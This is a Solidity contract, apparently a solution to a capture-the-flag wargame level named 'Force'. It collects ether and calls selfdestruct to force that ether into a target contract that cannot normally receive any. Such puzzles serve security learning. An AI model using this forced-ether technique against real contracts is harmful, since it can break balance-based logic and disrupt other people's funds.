// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./force.sol";
import "hardhat/console.sol";

/**
 * @title Pwn Force
 * @author Holly Grimm
 * @notice Make the balance of the Force contract greater than zero
 */
contract PwnForce {
    // @dev Address of Original Force Contract
    address payable private _forceContractAddress;

    event BalanceUpdated(uint256 value);

    constructor(address payable forceContractAddress) public {
        _forceContractAddress = forceContractAddress;
    }

    function collect() external payable returns (uint256) {
        emit BalanceUpdated(address(this).balance);
    }

    function selfDestroy() public {
        console.log(msg.sender, "PwnForce Contract.selfDestroy() about to call selfdestruct");
        selfdestruct(_forceContractAddress);
    }
}
